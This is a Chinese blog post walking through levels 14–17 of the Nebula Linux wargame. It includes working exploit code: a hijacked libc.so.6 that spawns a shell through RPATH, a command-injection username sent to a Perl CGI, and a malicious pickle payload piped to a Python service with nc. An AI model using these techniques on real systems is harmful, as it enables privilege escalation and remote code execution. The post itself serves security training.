<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="About-14"><a href="#About-14" class="headerlink" title="About"></a>About</h3><p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)<br>To do this level, log in as the level14 account with the password level14. Files for this level can be found in /home/flag14.<br>尝试输入./flag13 -e 111:<br>输出为123。<br>也就是按位加i于是写出加解密代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def encrypt(str):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(0,len(str)):</span><br><span class="line">        result += chr(ord(str[i])+i);</span><br><span class="line">    return result;</span><br><span class="line">def decrypt(str):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    for i in range(0, len(str)):</span><br><span class="line">        result += chr(ord(str[i]) - i);</span><br><span class="line">    return result</span><br><span class="line">str = decrypt(&quot;857:g67?5ABBo:BtDA?tIvLDKL&#123;MQPSRQWW.&quot;);</span><br><span class="line">print str;</span><br></pre></td></tr></table></figure></p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="About-15"><a href="#About-15" class="headerlink" title="About"></a>About</h3><p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.<br>You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.<br>Clean up after yourself :)<br>To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15.</p>
<h3 id="WP-13"><a href="#WP-13" class="headerlink" title="WP"></a>WP</h3><p>直接strace，得出flag15依赖于lib.so.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">strace ./flag15  </span><br><span class="line">execve(&quot;./flag15&quot;, [&quot;./flag15&quot;], [/* 20 vars */]) = 0  </span><br><span class="line">brk(0)                                  = 0x9e8f000  </span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)  </span><br><span class="line">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7783000  </span><br><span class="line">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/tls/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/tls&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/i686/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/i686/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/i686/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/i686&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  </span><br><span class="line">stat64(&quot;/var/tmp/flag15&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0  </span><br><span class="line">open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3  </span><br><span class="line">fstat64(3, &#123;st_mode=S_IFREG|0644, st_size=19771, ...&#125;) = 0  </span><br><span class="line">mmap2(NULL, 19771, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb777e000  </span><br><span class="line">close(3)                                = 0  </span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)  </span><br><span class="line">open(&quot;/lib/i386-linux-gnu/libc.so.6&quot;, O_RDONLY) = 3  </span><br><span class="line">read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;..., 512) = 512  </span><br><span class="line">fstat64(3, &#123;st_mode=S_IFREG|0755, st_size=1544392, ...&#125;) = 0  </span><br><span class="line">mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xc19000  </span><br><span class="line">mmap2(0xd8f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd8f000  </span><br><span class="line">mmap2(0xd92000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd92000  </span><br><span class="line">close(3)                                = 0  </span><br><span class="line">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb777d000  </span><br><span class="line">set_thread_area(&#123;entry_number:-1 -&gt; 6, base_addr:0xb777d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1&#125;) = 0  </span><br><span class="line">mprotect(0xd8f000, 8192, PROT_READ)     = 0  </span><br><span class="line">mprotect(0x8049000, 4096, PROT_READ)    = 0  </span><br><span class="line">mprotect(0xfdf000, 4096, PROT_READ)     = 0  </span><br><span class="line">munmap(0xb777e000, 19771)               = 0  </span><br><span class="line">fstat64(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0  </span><br><span class="line">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7782000  </span><br><span class="line">write(1, &quot;strace it!\n&quot;, 11strace it!  </span><br><span class="line">)            = 11</span><br><span class="line">exit_group(11)                          = ?</span><br></pre></td></tr></table></figure></p>
<p>通过<strong>objdump -p flag15</strong>命令我们得知/flag15在/var/tmp/flag15寻找libc.so.6，找不到再向其他系统默认的位置寻找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">flag15:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Program Header:  </span><br><span class="line">    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2</span><br><span class="line">         filesz 0x00000120 memsz 0x00000120 flags r-x</span><br><span class="line">  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0</span><br><span class="line">         filesz 0x00000013 memsz 0x00000013 flags r--</span><br><span class="line">    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12</span><br><span class="line">         filesz 0x000005d4 memsz 0x000005d4 flags r-x</span><br><span class="line">    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12</span><br><span class="line">         filesz 0x00000108 memsz 0x00000110 flags rw-</span><br><span class="line"> DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2</span><br><span class="line">         filesz 0x000000d0 memsz 0x000000d0 flags rw-</span><br><span class="line">    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2</span><br><span class="line">         filesz 0x00000044 memsz 0x00000044 flags r--</span><br><span class="line">EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2  </span><br><span class="line">         filesz 0x00000034 memsz 0x00000034 flags r--</span><br><span class="line">   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2</span><br><span class="line">         filesz 0x00000000 memsz 0x00000000 flags rw-</span><br><span class="line">   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0</span><br><span class="line">         filesz 0x000000f4 memsz 0x000000f4 flags r--</span><br><span class="line"></span><br><span class="line">Dynamic Section:  </span><br><span class="line">  NEEDED               libc.so.6</span><br><span class="line">  RPATH                /var/tmp/flag15</span><br><span class="line">  INIT                 0x080482c0</span><br><span class="line">  FINI                 0x080484ac</span><br><span class="line">  GNU_HASH             0x080481ac</span><br><span class="line">  STRTAB               0x0804821c</span><br><span class="line">  SYMTAB               0x080481cc</span><br><span class="line">  STRSZ                0x0000005a</span><br><span class="line">  SYMENT               0x00000010</span><br><span class="line">  DEBUG                0x00000000</span><br><span class="line">  PLTGOT               0x08049ff4</span><br><span class="line">  PLTRELSZ             0x00000018</span><br><span class="line">  PLTREL               0x00000011</span><br><span class="line">  JMPREL               0x080482a8</span><br><span class="line">  REL                  0x080482a0</span><br><span class="line">  RELSZ                0x00000008</span><br><span class="line">  RELENT               0x00000008</span><br><span class="line">  VERNEED              0x08048280</span><br><span class="line">  VERNEEDNUM           0x00000001</span><br><span class="line">  VERSYM               0x08048276</span><br><span class="line"></span><br><span class="line">Version References:  </span><br><span class="line">  required from libc.so.6:</span><br><span class="line">    0x0d696910 0x00 02 GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>另外，我们输入 <strong>objdump -R flag15</strong>，了解到它调用节几个函数，查下资料，我看是个<a href="http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/" target="_blank" rel="noopener">WP</a>，<code>__libc_start_main</code>是我们的目标。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag15:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS  </span><br><span class="line">OFFSET   TYPE              VALUE  </span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__  </span><br><span class="line">0804a000 R_386_JUMP_SLOT   puts  </span><br><span class="line">0804a004 R_386_JUMP_SLOT   __gmon_start__  </span><br><span class="line">0804a008 R_386_JUMP_SLOT   __libc_start_main</span><br></pre></td></tr></table></figure></p>
<p>那我们的工作就转向了 <strong>/var/tmp/flag15</strong>，<br>我们写个简单的pwn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) &#123;  </span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译<code>gcc -shared -fPIC -o libc.so.6 pwn15.c</code><br>运行flag15，结果如下</p>
<blockquote>
<p>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)<br>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)<br>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)<br>/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference</p>
</blockquote>
<p>我们少了一个 <strong>__cxa_finalize</strong>函数，接着编译，运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void __cxa_finalize (void *d) &#123;  </span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)<br>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)<br>/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</p>
</blockquote>
<p>这就是之前的需要GLIBC_2.0版本<br>我们新建一个version文件，内容为<code>GLIBC_2.0 { };</code>，接着编译<br><code>gcc -shared -fPIC -o libc.so.6 pwn15.c -Wl,--version-script=version</code>，运行flag15，结果如下</p>
<blockquote>
<p>/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference</p>
</blockquote>
<p>看WP需要静态编译，于是编译命令边为<br><code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 pwn15.c</code><br>成功进入shell，直接getflag</p>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="About-16"><a href="#About-16" class="headerlink" title="About"></a>About</h3><p>There is a perl script running on port 1616.<br>To do this level, log in as the level16 account with the password level16. Files for this level can be found in /home/flag16.</p>
<h3 id="Source-9"><a href="#Source-9" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env perl</span><br><span class="line"></span><br><span class="line">use CGI qw&#123;param&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;Content-type: text/html\n\n&quot;;</span><br><span class="line"></span><br><span class="line">sub login &#123;</span><br><span class="line">  $username = $_[0];</span><br><span class="line">  $password = $_[1];</span><br><span class="line"></span><br><span class="line">  $username =~ tr/a-z/A-Z/; # conver to uppercase</span><br><span class="line">  $username =~ s/\s.*//;        # strip everything after a space</span><br><span class="line"></span><br><span class="line">  @output = `egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`;</span><br><span class="line">  foreach $line (@output) &#123;</span><br><span class="line">      ($usr, $pw) = split(/:/, $line);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">      if($pw =~ $password) &#123;</span><br><span class="line">          return 1;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub htmlz &#123;</span><br><span class="line">  print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;);</span><br><span class="line">  if($_[0] == 1) &#123;</span><br><span class="line">      print(&quot;Your login was accepted&lt;br/&gt;&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">      print(&quot;Your login failed&lt;br/&gt;&quot;);</span><br><span class="line">  &#125;    </span><br><span class="line">  print(&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">htmlz(login(param(&quot;username&quot;), param(&quot;password&quot;)));</span><br></pre></td></tr></table></figure>
<p>又是一个perl<br>这题的考点主要站绕过两个限制</p>
<ol>
<li>大小写限制</li>
<li><a href="http://wiki.bash-hackers.org/syntax/pe#case_modification" target="_blank" rel="noopener">Case modification</a>  限制  </li>
</ol>
<ul>
<li>大小写验证可以通过大写名字的shell脚本绕过</li>
<li>需要把/home/flag16的环境变为/tmp的环境中，我们用到了shell通配符/*/xxx<br>先写一个python方便验证<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import urllib2</span><br><span class="line">from urllib import quote</span><br><span class="line">host = &apos;127.0.0.1:1616&apos;</span><br><span class="line">uri = &apos;http://&#123;&#125;/index.cgi?username=&#123;&#125;&amp;password=&#123;&#125;&apos;.format(host, quote(&apos;$(/*/CODE.SH)&apos;, safe=&apos;&apos;), &apos;&apos;)</span><br><span class="line">request = urllib2.urlopen(uri)</span><br><span class="line"># should take at least 5 seconds if the code is executed</span><br><span class="line">print request.read()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>还有一个验证的shell:CODE.SH<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">sleep 5</span><br></pre></td></tr></table></figure></p>
<p>运行时等待了5秒证明成功了<br>我们让程序自己调用getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">getflag &gt; /tmp/got</span><br></pre></td></tr></table></figure></p>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="About-17"><a href="#About-17" class="headerlink" title="About"></a>About</h3><p>There is a python script listening on port 10007 that contains a vulnerability.<br>To do this level, log in as the level17 account with the password level17. Files for this level can be found in /home/flag17.</p>
<h3 id="Source-10"><a href="#Source-10" class="headerlink" title="Source"></a>Source</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGCHLD, signal.SIG_IGN)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(skt)</span>:</span></span><br><span class="line">  line = skt.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">  obj = pickle.loads(line)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> obj:</span><br><span class="line">      clnt.send(<span class="string">"why did you send me "</span> + i + <span class="string">"?\n"</span>)</span><br><span class="line"></span><br><span class="line">skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, <span class="number">0</span>)</span><br><span class="line">skt.bind((<span class="string">'0.0.0.0'</span>, <span class="number">10007</span>))</span><br><span class="line">skt.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">  clnt, addr = skt.accept()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(os.fork() == <span class="number">0</span>):</span><br><span class="line">      clnt.send(<span class="string">"Accepted connection from %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line">      server(clnt)</span><br><span class="line">      exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="WP-14"><a href="#WP-14" class="headerlink" title="WP"></a>WP</h3><p>这题利用了python中pickle反序列化中的代码执行漏洞<br>这里我们做个实验<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    by = <span class="string">'lu4nx'</span></span><br><span class="line">    f = open(<span class="string">'./test1'</span>,<span class="string">'w'</span>)</span><br><span class="line">    pickle.dump(by,f)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(<span class="string">'./test1'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        test1();</span><br><span class="line">        f = open(<span class="string">'./test1'</span>)</span><br><span class="line">    a = pickle.load(f)</span><br><span class="line">    <span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></p>
<p>执行test1，会在py目录下生成一个test1文件<br>文件内容是</p>
<blockquote>
<p>S’lu4nx’<br>p0<br>.</p>
</blockquote>
<p>S’字符串’，源码中的解释是：Push a Python string object。这里我们理解成生成一个字符串即可。 同样，p操作符的解释是：Store the stack top into the memo. The stack is not popped。</p>
<p>接着我们可以利用前人已经构造好的命令执行函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S&apos;**命令**&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure></p>
<ul>
<li>导入模块os：cos</li>
<li>调用函数system</li>
<li>存储参数 -&gt; pop值和MARK对象（执行）</li>
</ul>
<p>如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S&apos;pwd&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure></p>
<p>输出为</p>
<blockquote>
<p>/tmp<br>0</p>
</blockquote>
<p>明显的命令执行，那么我们构造输入存在/tmp/exp中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system(S&apos;getflag&gt;/tmp/flag17&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure></p>
<p>运行命令<br><code>cat /tmp/exp | nc 127.0.0.1 10007</code><br>连接后敲击回车，Ctrl+C强制中断。就能获取到flag</p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/11/28/liunx练习/">liunx练习</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">lzp</a></p>
        <p><span>发布时间:</span>2018-11-28, 16:59:04</p>
        <p><span>最后更新:</span>2018-11-28, 17:01:12</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/11/28/liunx练习/" title="liunx练习">http://yoursite.com/2018/11/28/liunx练习/</a>
